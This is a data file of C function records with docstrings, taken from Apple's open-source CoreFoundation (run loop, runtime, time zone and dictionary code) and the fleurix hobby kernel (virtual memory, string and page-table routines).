{"docstring": "/* CFRunLoopObserver */\n", "func_signal": "static CFStringRef __CFRunLoopObserverCopyDescription(CFTypeRef cf)", "code": "{\t/* DOES CALLOUT */\n    CFRunLoopObserverRef rlo = (CFRunLoopObserverRef)cf;\n    CFStringRef result;\n    CFStringRef contextDesc = NULL;\n    if (NULL != rlo->_context.copyDescription) {\n\tcontextDesc = rlo->_context.copyDescription(rlo->_context.info);\n    }\n    if (!contextDesc) {\n\tcontextDesc = CFStringCreateWithFormat(kCFAllocatorSystemDefault, NULL, CFSTR(\"<CFRunLoopObserver context %p>\"), rlo->_context.info);\n    }\n#if DEPLOYMENT_TARGET_WINDOWS\n    result = CFStringCreateWithFormat(kCFAllocatorSystemDefault, NULL, CFSTR(\"<CFRunLoopObserver %p [%p]>{valid = %s, activities = 0x%x, repeats = %s, order = %d, callout = %p, context = %@}\"), cf, CFGetAllocator(rlo), __CFIsValid(rlo) ? \"Yes\" : \"No\", rlo->_activities, __CFRunLoopObserverRepeats(rlo) ? \"Yes\" : \"No\", rlo->_order, rlo->_callout, contextDesc);    \n#elif DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n    void *addr = rlo->_callout;\n    Dl_info info;\n    const char *name = (dladdr(addr, &info) && info.dli_saddr == addr && info.dli_sname) ? info.dli_sname : \"???\";\n    result = CFStringCreateWithFormat(kCFAllocatorSystemDefault, NULL, CFSTR(\"<CFRunLoopObserver %p [%p]>{valid = %s, activities = 0x%lx, repeats = %s, order = %ld, callout = %s (%p), context = %@}\"), cf, CFGetAllocator(rlo), __CFIsValid(rlo) ? \"Yes\" : \"No\", (long)rlo->_activities, __CFRunLoopObserverRepeats(rlo) ? \"Yes\" : \"No\", (long)rlo->_order, name, addr, contextDesc);\n#endif\n    CFRelease(contextDesc);\n    return result;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// Definition: if type produces a formatting description, return that string, otherwise NULL\n", "func_signal": "CF_PRIVATE CFStringRef __CFCopyFormattingDescription(CFTypeRef cf, CFDictionaryRef formatOptions)", "code": "{\n    if (NULL == cf) return NULL;\n    __CFGenericAssertIsCF(cf);\n    if (NULL != __CFRuntimeClassTable[__CFGenericTypeID_inline(cf)]->copyFormattingDesc) {\n\treturn __CFRuntimeClassTable[__CFGenericTypeID_inline(cf)]->copyFormattingDesc(cf, formatOptions);\n    }\n    return NULL;\n}", "path": "CFRuntime.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// Returns portBuf if ports fit in that space, else returns another ptr that must be freed\n", "func_signal": "static __CFPort *__CFPortSetGetPorts(__CFPortSet portSet, __CFPort *portBuf, uint32_t bufSize, uint32_t *portsUsed)", "code": "{\n    __CFLock(&(portSet->lock));\n    __CFPort *result = portBuf;\n    if (bufSize < portSet->used)\n\tresult = (__CFPort *)CFAllocatorAllocate(kCFAllocatorSystemDefault, portSet->used * sizeof(HANDLE), 0);\n    if (portSet->used > 1) {\n\t// rotate the ports to vaguely simulate round-robin behaviour\n\tuint16_t lastPort = portSet->used - 1;\n\tHANDLE swapHandle = portSet->handles[0];\n\tmemmove(portSet->handles, &portSet->handles[1], lastPort * sizeof(HANDLE));\n\tportSet->handles[lastPort] = swapHandle;\n    }\n    memmove(result, portSet->handles, portSet->used * sizeof(HANDLE));\n    *portsUsed = portSet->used;\n    __CFUnlock(&(portSet->lock));\n    return result;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// definition: produces a normally non-NULL debugging description of the object\n", "func_signal": "CFStringRef CFCopyDescription(CFTypeRef cf)", "code": "{\n    if (NULL == cf) return NULL;\n    // CFTYPE_OBJC_FUNCDISPATCH0(CFStringRef, cf, _copyDescription);  // XXX returns 0 refcounted item under GC\n    __CFGenericAssertIsCF(cf);\n    if (NULL != __CFRuntimeClassTable[__CFGenericTypeID_inline(cf)]->copyDebugDesc) {\n\tCFStringRef result = __CFRuntimeClassTable[__CFGenericTypeID_inline(cf)]->copyDebugDesc(cf);\n\tif (NULL != result) return result;\n    }\n    return CFStringCreateWithFormat(kCFAllocatorSystemDefault, NULL, CFSTR(\"<%s %p [%p]>\"), __CFRuntimeClassTable[__CFGenericTypeID_inline(cf)]->className, cf, CFGetAllocator(cf));\n}", "path": "CFRuntime.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "/* This function should be used for WIN32 instead of\n * __CFCopyRecursiveDirectoryList function.\n * It takes TimeZone names from the registry\n * (Aleksey Dukhnyakov)\n */\n", "func_signal": "static CFMutableArrayRef __CFCopyWindowsTimeZoneList()", "code": "{\n    CFMutableArrayRef result = NULL;\n    HKEY hkResult;\n    TCHAR lpName[MAX_PATH+1];\n    DWORD dwIndex, retCode;\n\n    if (RegOpenKey(HKEY_LOCAL_MACHINE,_T(TZZONEINFO),&hkResult) !=\n        ERROR_SUCCESS )\n        return NULL;\n\n    result = CFArrayCreateMutable(kCFAllocatorSystemDefault, 0, &kCFTypeArrayCallBacks);\n    for (dwIndex=0; (retCode = RegEnumKey(hkResult,dwIndex,lpName,MAX_PATH)) != ERROR_NO_MORE_ITEMS ; dwIndex++) {\n        if (retCode != ERROR_SUCCESS) {\n            RegCloseKey(hkResult);\n            CFRelease(result);\n            return NULL;\n        } else {\n#if defined(UNICODE)\n\t    CFStringRef string = CFStringCreateWithBytes(kCFAllocatorSystemDefault, (const UInt8 *)lpName, (_tcslen(lpName) * sizeof(UniChar)), kCFStringEncodingUnicode, false);\n#else\n\t    CFStringRef string = CFStringCreateWithBytes(kCFAllocatorSystemDefault, lpName, _tcslen(lpName), CFStringGetSystemEncoding(), false);\n#endif\n\t    CFArrayAppendValue(result, string);\n\t    CFRelease(string);\n        }\n    }\n\n    RegCloseKey(hkResult);\n    return result;\n}", "path": "CFTimeZone.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// This function is for Foundation's benefit; no one else should use it.\n", "func_signal": "CF_EXPORT void _CFDictionarySetCapacity(CFMutableHashRef hc, CFIndex cap)", "code": "{\n    if (CF_IS_OBJC(CFDictionaryGetTypeID(), hc)) return;\n    __CFGenericValidateType(hc, CFDictionaryGetTypeID());\n    CFAssert2(CFBasicHashIsMutable((CFBasicHashRef)hc), __kCFLogAssertion, \"%s(): immutable collection %p passed to mutating operation\", __PRETTY_FUNCTION__, hc);\n    CFAssert3(CFDictionaryGetCount(hc) <= cap, __kCFLogAssertion, \"%s(): desired capacity (%ld) is less than count (%ld)\", __PRETTY_FUNCTION__, cap, CFDictionaryGetCount(hc));\n    CFBasicHashSetCapacity((CFBasicHashRef)hc, cap);\n}", "path": "CFDictionary.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// call with rl and rlm locked\n", "func_signal": "static CFRunLoopSourceRef __CFRunLoopModeFindSourceForMachPort(CFRunLoopRef rl, CFRunLoopModeRef rlm, __CFPort port)", "code": "{\t/* DOES CALLOUT */\n    CHECK_FOR_FORK();\n    CFRunLoopSourceRef found = rlm->_portToV1SourceMap ? (CFRunLoopSourceRef)CFDictionaryGetValue(rlm->_portToV1SourceMap, (const void *)(uintptr_t)port) : NULL;\n    return found;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "/* rl, rlm are locked on entrance and exit */\n", "func_signal": "static int32_t __CFRunLoopRun(CFRunLoopRef rl, CFRunLoopModeRef rlm, CFTimeInterval seconds, Boolean stopAfterHandle, CFRunLoopModeRef previousMode)", "code": "{\n    uint64_t startTSR = mach_absolute_time();\n\n    if (__CFRunLoopIsStopped(rl)) {\n        __CFRunLoopUnsetStopped(rl);\n\treturn kCFRunLoopRunStopped;\n    } else if (rlm->_stopped) {\n\trlm->_stopped = false;\n\treturn kCFRunLoopRunStopped;\n    }\n    \n    mach_port_name_t dispatchPort = MACH_PORT_NULL;\n    Boolean libdispatchQSafe = pthread_main_np() && ((HANDLE_DISPATCH_ON_BASE_INVOCATION_ONLY && NULL == previousMode) || (!HANDLE_DISPATCH_ON_BASE_INVOCATION_ONLY && 0 == _CFGetTSD(__CFTSDKeyIsInGCDMainQ)));\n    if (libdispatchQSafe && (CFRunLoopGetMain() == rl) && CFSetContainsValue(rl->_commonModes, rlm->_name)) dispatchPort = _dispatch_get_main_queue_port_4CF();\n    \n#if USE_DISPATCH_SOURCE_FOR_TIMERS\n    mach_port_name_t modeQueuePort = MACH_PORT_NULL;\n    if (rlm->_queue) {\n        modeQueuePort = _dispatch_runloop_root_queue_get_port_4CF(rlm->_queue);\n        if (!modeQueuePort) {\n            CRASH(\"Unable to get port for run loop mode queue (%d)\", -1);\n        }\n    }\n#endif\n    \n    dispatch_source_t timeout_timer = NULL;\n    struct __timeout_context *timeout_context = (struct __timeout_context *)malloc(sizeof(*timeout_context));\n    if (seconds <= 0.0) { // instant timeout\n        seconds = 0.0;\n        timeout_context->termTSR = 0ULL;\n    } else if (seconds <= TIMER_INTERVAL_LIMIT) {\n\tdispatch_queue_t queue = pthread_main_np() ? __CFDispatchQueueGetGenericMatchingMain() : __CFDispatchQueueGetGenericBackground();\n\ttimeout_timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, queue);\n        dispatch_retain(timeout_timer);\n\ttimeout_context->ds = timeout_timer;\n\ttimeout_context->rl = (CFRunLoopRef)CFRetain(rl);\n\ttimeout_context->termTSR = startTSR + __CFTimeIntervalToTSR(seconds);\n\tdispatch_set_context(timeout_timer, timeout_context); // source gets ownership of context\n\tdispatch_source_set_event_handler_f(timeout_timer, __CFRunLoopTimeout);\n        dispatch_source_set_cancel_handler_f(timeout_timer, __CFRunLoopTimeoutCancel);\n        uint64_t ns_at = (uint64_t)((__CFTSRToTimeInterval(startTSR) + seconds) * 1000000000ULL);\n        dispatch_source_set_timer(timeout_timer, dispatch_time(1, ns_at), DISPATCH_TIME_FOREVER, 1000ULL);\n        dispatch_resume(timeout_timer);\n    } else { // infinite timeout\n        seconds = 9999999999.0;\n        timeout_context->termTSR = UINT64_MAX;\n    }\n\n    Boolean didDispatchPortLastTime = true;\n    int32_t retVal = 0;\n    do {\n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n        voucher_mach_msg_state_t voucherState = VOUCHER_MACH_MSG_STATE_UNCHANGED;\n        voucher_t voucherCopy = NULL;\n#endif\n        uint8_t msg_buffer[3 * 1024];\n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n        mach_msg_header_t *msg = NULL;\n        mach_port_t livePort = MACH_PORT_NULL;\n#elif DEPLOYMENT_TARGET_WINDOWS\n        HANDLE livePort = NULL;\n        Boolean windowsMessageReceived = false;\n#endif\n\t__CFPortSet waitSet = rlm->_portSet;\n\n        __CFRunLoopUnsetIgnoreWakeUps(rl);\n\n        if (rlm->_observerMask & kCFRunLoopBeforeTimers) __CFRunLoopDoObservers(rl, rlm, kCFRunLoopBeforeTimers);\n        if (rlm->_observerMask & kCFRunLoopBeforeSources) __CFRunLoopDoObservers(rl, rlm, kCFRunLoopBeforeSources);\n\n\t__CFRunLoopDoBlocks(rl, rlm);\n\n        Boolean sourceHandledThisLoop = __CFRunLoopDoSources0(rl, rlm, stopAfterHandle);\n        if (sourceHandledThisLoop) {\n            __CFRunLoopDoBlocks(rl, rlm);\n\t}\n\n        Boolean poll = sourceHandledThisLoop || (0ULL == timeout_context->termTSR);\n\n        if (MACH_PORT_NULL != dispatchPort && !didDispatchPortLastTime) {\n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n            msg = (mach_msg_header_t *)msg_buffer;\n            if (__CFRunLoopServiceMachPort(dispatchPort, &msg, sizeof(msg_buffer), &livePort, 0, &voucherState, NULL)) {\n                goto handle_msg;\n            }\n#elif DEPLOYMENT_TARGET_WINDOWS\n            if (__CFRunLoopWaitForMultipleObjects(NULL, &dispatchPort, 0, 0, &livePort, NULL)) {\n                goto handle_msg;\n            }\n#endif\n        }\n\n        didDispatchPortLastTime = false;\n\n\tif (!poll && (rlm->_observerMask & kCFRunLoopBeforeWaiting)) __CFRunLoopDoObservers(rl, rlm, kCFRunLoopBeforeWaiting);\n\t__CFRunLoopSetSleeping(rl);\n\t// do not do any user callouts after this point (after notifying of sleeping)\n\n        // Must push the local-to-this-activation ports in on every loop\n        // iteration, as this mode could be run re-entrantly and we don't\n        // want these ports to get serviced.\n\n        __CFPortSetInsert(dispatchPort, waitSet);\n        \n\t__CFRunLoopModeUnlock(rlm);\n\t__CFRunLoopUnlock(rl);\n\n        CFAbsoluteTime sleepStart = poll ? 0.0 : CFAbsoluteTimeGetCurrent();\n\n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n#if USE_DISPATCH_SOURCE_FOR_TIMERS\n        do {\n            if (kCFUseCollectableAllocator) {\n                // objc_clear_stack(0);\n                // <rdar://problem/16393959>\n                memset(msg_buffer, 0, sizeof(msg_buffer));\n            }\n            msg = (mach_msg_header_t *)msg_buffer;\n            \n            __CFRunLoopServiceMachPort(waitSet, &msg, sizeof(msg_buffer), &livePort, poll ? 0 : TIMEOUT_INFINITY, &voucherState, &voucherCopy);\n            \n            if (modeQueuePort != MACH_PORT_NULL && livePort == modeQueuePort) {\n                // Drain the internal queue. If one of the callout blocks sets the timerFired flag, break out and service the timer.\n                while (_dispatch_runloop_root_queue_perform_4CF(rlm->_queue));\n                if (rlm->_timerFired) {\n                    // Leave livePort as the queue port, and service timers below\n                    rlm->_timerFired = false;\n                    break;\n                } else {\n                    if (msg && msg != (mach_msg_header_t *)msg_buffer) free(msg);\n                }\n            } else {\n                // Go ahead and leave the inner loop.\n                break;\n            }\n        } while (1);\n#else\n        if (kCFUseCollectableAllocator) {\n            // objc_clear_stack(0);\n            // <rdar://problem/16393959>\n            memset(msg_buffer, 0, sizeof(msg_buffer));\n        }\n        msg = (mach_msg_header_t *)msg_buffer;\n        __CFRunLoopServiceMachPort(waitSet, &msg, sizeof(msg_buffer), &livePort, poll ? 0 : TIMEOUT_INFINITY, &voucherState, &voucherCopy);\n#endif\n        \n        \n#elif DEPLOYMENT_TARGET_WINDOWS\n        // Here, use the app-supplied message queue mask. They will set this if they are interested in having this run loop receive windows messages.\n        __CFRunLoopWaitForMultipleObjects(waitSet, NULL, poll ? 0 : TIMEOUT_INFINITY, rlm->_msgQMask, &livePort, &windowsMessageReceived);\n#endif\n        \n        __CFRunLoopLock(rl);\n        __CFRunLoopModeLock(rlm);\n\n        rl->_sleepTime += (poll ? 0.0 : (CFAbsoluteTimeGetCurrent() - sleepStart));\n\n        // Must remove the local-to-this-activation ports in on every loop\n        // iteration, as this mode could be run re-entrantly and we don't\n        // want these ports to get serviced. Also, we don't want them left\n        // in there if this function returns.\n\n        __CFPortSetRemove(dispatchPort, waitSet);\n        \n        __CFRunLoopSetIgnoreWakeUps(rl);\n\n        // user callouts now OK again\n\t__CFRunLoopUnsetSleeping(rl);\n\tif (!poll && (rlm->_observerMask & kCFRunLoopAfterWaiting)) __CFRunLoopDoObservers(rl, rlm, kCFRunLoopAfterWaiting);\n\n        handle_msg:;\n        __CFRunLoopSetIgnoreWakeUps(rl);\n\n#if DEPLOYMENT_TARGET_WINDOWS\n        if (windowsMessageReceived) {\n            // These Win32 APIs cause a callout, so make sure we're unlocked first and relocked after\n            __CFRunLoopModeUnlock(rlm);\n\t    __CFRunLoopUnlock(rl);\n\n            if (rlm->_msgPump) {\n                rlm->_msgPump();\n            } else {\n                MSG msg;\n                if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE | PM_NOYIELD)) {\n                    TranslateMessage(&msg);\n                    DispatchMessage(&msg);\n                }\n            }\n            \n            __CFRunLoopLock(rl);\n\t    __CFRunLoopModeLock(rlm);\n \t    sourceHandledThisLoop = true;\n            \n            // To prevent starvation of sources other than the message queue, we check again to see if any other sources need to be serviced\n            // Use 0 for the mask so windows messages are ignored this time. Also use 0 for the timeout, because we're just checking to see if the things are signalled right now -- we will wait on them again later.\n            // NOTE: Ignore the dispatch source (it's not in the wait set anymore) and also don't run the observers here since we are polling.\n            __CFRunLoopSetSleeping(rl);\n            __CFRunLoopModeUnlock(rlm);\n            __CFRunLoopUnlock(rl);\n            \n            __CFRunLoopWaitForMultipleObjects(waitSet, NULL, 0, 0, &livePort, NULL);\n            \n            __CFRunLoopLock(rl);\n            __CFRunLoopModeLock(rlm);            \n            __CFRunLoopUnsetSleeping(rl);\n            // If we have a new live port then it will be handled below as normal\n        }\n        \n        \n#endif\n        if (MACH_PORT_NULL == livePort) {\n            CFRUNLOOP_WAKEUP_FOR_NOTHING();\n            // handle nothing\n        } else if (livePort == rl->_wakeUpPort) {\n            CFRUNLOOP_WAKEUP_FOR_WAKEUP();\n            // do nothing on Mac OS\n#if DEPLOYMENT_TARGET_WINDOWS\n            // Always reset the wake up port, or risk spinning forever\n            ResetEvent(rl->_wakeUpPort);\n#endif\n        }\n#if USE_DISPATCH_SOURCE_FOR_TIMERS\n        else if (modeQueuePort != MACH_PORT_NULL && livePort == modeQueuePort) {\n            CFRUNLOOP_WAKEUP_FOR_TIMER();\n            if (!__CFRunLoopDoTimers(rl, rlm, mach_absolute_time())) {\n                // Re-arm the next timer, because we apparently fired early\n                __CFArmNextTimerInMode(rlm, rl);\n            }\n        }\n#endif\n#if USE_MK_TIMER_TOO\n        else if (rlm->_timerPort != MACH_PORT_NULL && livePort == rlm->_timerPort) {\n            CFRUNLOOP_WAKEUP_FOR_TIMER();\n            // On Windows, we have observed an issue where the timer port is set before the time which we requested it to be set. For example, we set the fire time to be TSR 167646765860, but it is actually observed firing at TSR 167646764145, which is 1715 ticks early. The result is that, when __CFRunLoopDoTimers checks to see if any of the run loop timers should be firing, it appears to be 'too early' for the next timer, and no timers are handled.\n            // In this case, the timer port has been automatically reset (since it was returned from MsgWaitForMultipleObjectsEx), and if we do not re-arm it, then no timers will ever be serviced again unless something adjusts the timer list (e.g. adding or removing timers). The fix for the issue is to reset the timer here if CFRunLoopDoTimers did not handle a timer itself. 9308754\n            if (!__CFRunLoopDoTimers(rl, rlm, mach_absolute_time())) {\n                // Re-arm the next timer\n                __CFArmNextTimerInMode(rlm, rl);\n            }\n        }\n#endif\n        else if (livePort == dispatchPort) {\n            CFRUNLOOP_WAKEUP_FOR_DISPATCH();\n            __CFRunLoopModeUnlock(rlm);\n            __CFRunLoopUnlock(rl);\n            _CFSetTSD(__CFTSDKeyIsInGCDMainQ, (void *)6, NULL);\n#if DEPLOYMENT_TARGET_WINDOWS\n            void *msg = 0;\n#endif\n            __CFRUNLOOP_IS_SERVICING_THE_MAIN_DISPATCH_QUEUE__(msg);\n            _CFSetTSD(__CFTSDKeyIsInGCDMainQ, (void *)0, NULL);\n            __CFRunLoopLock(rl);\n            __CFRunLoopModeLock(rlm);\n            sourceHandledThisLoop = true;\n            didDispatchPortLastTime = true;\n        } else {\n            CFRUNLOOP_WAKEUP_FOR_SOURCE();\n            \n            // If we received a voucher from this mach_msg, then put a copy of the new voucher into TSD. CFMachPortBoost will look in the TSD for the voucher. By using the value in the TSD we tie the CFMachPortBoost to this received mach_msg explicitly without a chance for anything in between the two pieces of code to set the voucher again.\n            voucher_t previousVoucher = _CFSetTSD(__CFTSDKeyMachMessageHasVoucher, (void *)voucherCopy, os_release);\n\n            // Despite the name, this works for windows handles as well\n            CFRunLoopSourceRef rls = __CFRunLoopModeFindSourceForMachPort(rl, rlm, livePort);\n            if (rls) {\n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n\t\tmach_msg_header_t *reply = NULL;\n\t\tsourceHandledThisLoop = __CFRunLoopDoSource1(rl, rlm, rls, msg, msg->msgh_size, &reply) || sourceHandledThisLoop;\n\t\tif (NULL != reply) {\n\t\t    (void)mach_msg(reply, MACH_SEND_MSG, reply->msgh_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);\n\t\t    CFAllocatorDeallocate(kCFAllocatorSystemDefault, reply);\n\t\t}\n#elif DEPLOYMENT_TARGET_WINDOWS\n                sourceHandledThisLoop = __CFRunLoopDoSource1(rl, rlm, rls) || sourceHandledThisLoop;\n#endif\n\t    }\n            \n            // Restore the previous voucher\n            _CFSetTSD(__CFTSDKeyMachMessageHasVoucher, previousVoucher, os_release);\n            \n        } \n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n        if (msg && msg != (mach_msg_header_t *)msg_buffer) free(msg);\n#endif\n        \n\t__CFRunLoopDoBlocks(rl, rlm);\n        \n\n\tif (sourceHandledThisLoop && stopAfterHandle) {\n\t    retVal = kCFRunLoopRunHandledSource;\n        } else if (timeout_context->termTSR < mach_absolute_time()) {\n            retVal = kCFRunLoopRunTimedOut;\n\t} else if (__CFRunLoopIsStopped(rl)) {\n            __CFRunLoopUnsetStopped(rl);\n\t    retVal = kCFRunLoopRunStopped;\n\t} else if (rlm->_stopped) {\n\t    rlm->_stopped = false;\n\t    retVal = kCFRunLoopRunStopped;\n\t} else if (__CFRunLoopModeIsEmpty(rl, rlm, previousMode)) {\n\t    retVal = kCFRunLoopRunFinished;\n\t}\n        \n#if DEPLOYMENT_TARGET_MACOSX || DEPLOYMENT_TARGET_EMBEDDED || DEPLOYMENT_TARGET_EMBEDDED_MINI\n        voucher_mach_msg_revert(voucherState);\n        os_release(voucherCopy);\n#endif\n\n    } while (0 == retVal);\n\n    if (timeout_timer) {\n        dispatch_source_cancel(timeout_timer);\n        dispatch_release(timeout_timer);\n    } else {\n        free(timeout_context);\n    }\n\n    return retVal;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "/* call with rl locked, returns mode locked */\n", "func_signal": "static CFRunLoopModeRef __CFRunLoopFindMode(CFRunLoopRef rl, CFStringRef modeName, Boolean create)", "code": "{\n    CHECK_FOR_FORK();\n    CFRunLoopModeRef rlm;\n    struct __CFRunLoopMode srlm;\n    memset(&srlm, 0, sizeof(srlm));\n    _CFRuntimeSetInstanceTypeIDAndIsa(&srlm, __kCFRunLoopModeTypeID);\n    srlm._name = modeName;\n    rlm = (CFRunLoopModeRef)CFSetGetValue(rl->_modes, &srlm);\n    if (NULL != rlm) {\n\t__CFRunLoopModeLock(rlm);\n\treturn rlm;\n    }\n    if (!create) {\n\treturn NULL;\n    }\n    rlm = (CFRunLoopModeRef)_CFRuntimeCreateInstance(kCFAllocatorSystemDefault, __kCFRunLoopModeTypeID, sizeof(struct __CFRunLoopMode) - sizeof(CFRuntimeBase), NULL);\n    if (NULL == rlm) {\n\treturn NULL;\n    }\n    __CFRunLoopLockInit(&rlm->_lock);\n    rlm->_name = CFStringCreateCopy(kCFAllocatorSystemDefault, modeName);\n    rlm->_stopped = false;\n    rlm->_portToV1SourceMap = NULL;\n    rlm->_sources0 = NULL;\n    rlm->_sources1 = NULL;\n    rlm->_observers = NULL;\n    rlm->_timers = NULL;\n    rlm->_observerMask = 0;\n    rlm->_portSet = __CFPortSetAllocate();\n    rlm->_timerSoftDeadline = UINT64_MAX;\n    rlm->_timerHardDeadline = UINT64_MAX;\n    \n    kern_return_t ret = KERN_SUCCESS;\n#if USE_DISPATCH_SOURCE_FOR_TIMERS\n    rlm->_timerFired = false;\n    rlm->_queue = _dispatch_runloop_root_queue_create_4CF(\"Run Loop Mode Queue\", 0);\n    mach_port_t queuePort = _dispatch_runloop_root_queue_get_port_4CF(rlm->_queue);\n    if (queuePort == MACH_PORT_NULL) CRASH(\"*** Unable to create run loop mode queue port. (%d) ***\", -1);\n    rlm->_timerSource = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, rlm->_queue);\n    \n    __block Boolean *timerFiredPointer = &(rlm->_timerFired);\n    dispatch_source_set_event_handler(rlm->_timerSource, ^{\n        *timerFiredPointer = true;\n    });\n    \n    // Set timer to far out there. The unique leeway makes this timer easy to spot in debug output.\n    _dispatch_source_set_runloop_timer_4CF(rlm->_timerSource, DISPATCH_TIME_FOREVER, DISPATCH_TIME_FOREVER, 321);\n    dispatch_resume(rlm->_timerSource);\n    \n    ret = __CFPortSetInsert(queuePort, rlm->_portSet);\n    if (KERN_SUCCESS != ret) CRASH(\"*** Unable to insert timer port into port set. (%d) ***\", ret);\n    \n#endif\n#if USE_MK_TIMER_TOO\n    rlm->_timerPort = mk_timer_create();\n    ret = __CFPortSetInsert(rlm->_timerPort, rlm->_portSet);\n    if (KERN_SUCCESS != ret) CRASH(\"*** Unable to insert timer port into port set. (%d) ***\", ret);\n#endif\n    \n    ret = __CFPortSetInsert(rl->_wakeUpPort, rlm->_portSet);\n    if (KERN_SUCCESS != ret) CRASH(\"*** Unable to insert wake up port into port set. (%d) ***\", ret);\n    \n#if DEPLOYMENT_TARGET_WINDOWS\n    rlm->_msgQMask = 0;\n    rlm->_msgPump = NULL;\n#endif\n    CFSetAddValue(rl->_modes, rlm);\n    CFRelease(rlm);\n    __CFRunLoopModeLock(rlm);\t/* return mode locked */\n    return rlm;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// rounds offset to nearest minute\n", "func_signal": "CFTimeZoneRef CFTimeZoneCreateWithTimeIntervalFromGMT(CFAllocatorRef allocator, CFTimeInterval ti)", "code": "{\n    CFTimeZoneRef result;\n    CFStringRef name;\n    int32_t seconds, minute, hour;\n    if (allocator == NULL) allocator = __CFGetDefaultAllocator();\n    __CFGenericValidateType(allocator, CFAllocatorGetTypeID());\n    if (ti < -18.0 * 3600 || 18.0 * 3600 < ti) return NULL;\n    ti = (ti < 0.0) ? ceil((ti / 60.0) - 0.5) * 60.0 : floor((ti / 60.0) + 0.5) * 60.0;\n    seconds = (int32_t)ti;\n    hour = (ti < 0) ? (-seconds / 3600) : (seconds / 3600);\n    seconds -= ((ti < 0) ? -hour : hour) * 3600;\n    minute = (ti < 0) ? (-seconds / 60) : (seconds / 60);\n    if (fabs(ti) < 1.0) {\n\tname = (CFStringRef)CFRetain(CFSTR(\"GMT\"));\n    } else {\n\tname = CFStringCreateWithFormat(allocator, NULL, CFSTR(\"GMT%c%02d%02d\"), (ti < 0.0 ? '-' : '+'), hour, minute);\n    }\n    result = __CFTimeZoneCreateFixed(allocator, (int32_t)ti, name, 0);\n    CFRelease(name);\n    return result;\n}", "path": "CFTimeZone.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "/*\n * Clone the kernel's address space first, the only way on\n * initializing a struct vm.\n * */\n", "func_signal": "int vm_clone(struct vm *to)", "code": "{\n    int i;\n    struct vma *vp;\n\n    to->vm_pgd = (struct pde*)kmalloc(PAGE);\n    // clone kernel's address space\n    pgd_init(to->vm_pgd);\n    // clone user's, aka for each VMA.\n    for (i=0; i<NVMA; i++) {\n        vp = &(cu->p_vm.vm_area[i]);\n        if (vp->v_flag != 0) {\n            // increase the reference count of inode\n            if (vp->v_ino) {\n                vp->v_ino->i_count++;\n            }\n            to->vm_area[i] = *vp;\n        }\n    }\n    // copy pages tables, with PTE_W turned off.\n    pt_copy(to->vm_pgd, cu->p_vm.vm_pgd);\n    return 0;\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/*\n * note that '\\0' is considered to be part of the string.\n * returns not a number but a pointer.\n * */\n", "func_signal": "char* strchr(const char *str, int c)", "code": "{\n    char *tmp = (char*)str;\n\n    for(; *tmp!='\\0'; tmp++) {\n        if (*tmp == (char)c) {\n            return tmp;\n        }\n    }\n    if (*tmp == (char)c)\n        return tmp;\n    return NULL;\n}", "path": "src\\lib\\string.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* decrease all the pages' reference count, and free the page tables. */\n", "func_signal": "int pt_free(struct pde *pgd)", "code": "{\n    struct pde *pde;\n    struct pte *pte, *pt;\n    struct page *pg;\n    uint pdn, pn;\n\n    for(pdn=PDX(KMEM_END); pdn<1024; pdn++) {\n        pde = &pgd[pdn];\n        if (pde->pd_flag & PTE_P) {\n            pt = (struct pte*)(pde->pd_off * PAGE);\n            for(pn=0; pn<1024; pn++) {\n                pte = &pt[pn];\n                if (pte->pt_flag & PTE_P) {\n                    pg = pgfind(pte->pt_off);\n                    pgfree(pg);\n                }\n            }\n            kfree(pt, PAGE);\n        }\n    }\n    return 0;\n}", "path": "src\\mm\\pte.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
